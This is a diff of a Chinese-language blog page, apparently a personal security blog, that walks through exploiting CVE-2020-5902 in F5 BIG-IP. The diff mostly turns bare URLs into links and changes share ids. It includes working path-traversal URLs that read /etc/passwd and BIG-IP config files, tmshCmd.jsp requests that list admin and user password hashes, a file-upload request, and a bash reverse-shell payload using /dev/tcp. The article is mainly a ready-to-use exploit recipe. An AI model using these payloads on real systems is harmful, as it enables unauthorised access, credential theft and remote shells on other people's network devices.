@@ -87,7 +87,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>文件读取</p>
-<p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</p>
+<p><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</a><br><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts</a><br><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license</a><br><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</a></p>
 <img src="../img/cve/2020-5902/readfile.png" class="full-image">
 
 
@@ -99,7 +99,7 @@
 <p>3.执行bash文件</p>
 <p>PS:即使漏洞存在也可能需要多次执行才能成功（4次左右）。<br>同时可用反弹shell(将第二步的Payload换 为/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp? fileName=/tmp/1.txt&amp;content=bash+-i+&gt;%26+/dev/tcp/ip/port+0+&gt;=%26+1)</p>
 <p>4.还原list命令 <a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp</a>? command=delete+cli+alias+private+list</p>
-<p>查看admin的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin<br>查看所有用户的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list auth user</p>
+<p>查看admin的密码：<a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</a><br>查看所有用户的密码：<a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list</a> auth user</p>
 <img src="../img/cve/2020-5902/rce1.png" class="full-image">
 
 <img src="../img/cve/2020-5902/rce2.png" class="full-image">
@@ -107,14 +107,15 @@
 
 
 <p>文件上传</p>
-<p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp<br>POST：fileName=/tmp/1.txt&amp;content=CVE-2020-5902</p>
+<p><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</a><br>POST：fileName=/tmp/1.txt&amp;content=CVE-2020-5902</p>
 <img src="../img/cve/2020-5902/uploadfile-1.png" class="full-image">
 
 <img src="../img/cve/2020-5902/uploadfile-2.png" class="full-image">
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://www.jinny.vip/2020/07/06/cve-2020-5902/" data-id="ckca5gvo2000073nbd6nydnqq" class="article-share-link">Share</a>
+      <a data-url="http://www.jinny.vip/2020/07/06/cve-2020-5902/" data-id="ckca5k0jr00008hnb930bd3wc" class="article-share-link">Share</a>
       
       
     </footer>
@@ -171,7 +172,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://www.jinny.vip/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/" data-id="ckca5gvoa000173nbgxw9988o" class="article-share-link">Share</a>
+      <a data-url="http://www.jinny.vip/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/" data-id="ckca5k0k100018hnbfq6a4178" class="article-share-link">Share</a>
       
       
     </footer>
@@ -208,7 +209,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://www.jinny.vip/2020/06/02/smtp-shell/" data-id="ckca5gvod000273nbg3q6fpbn" class="article-share-link">Share</a>
+      <a data-url="http://www.jinny.vip/2020/06/02/smtp-shell/" data-id="ckca5k0k500028hnb3gkogvun" class="article-share-link">Share</a>
       
       
     </footer>
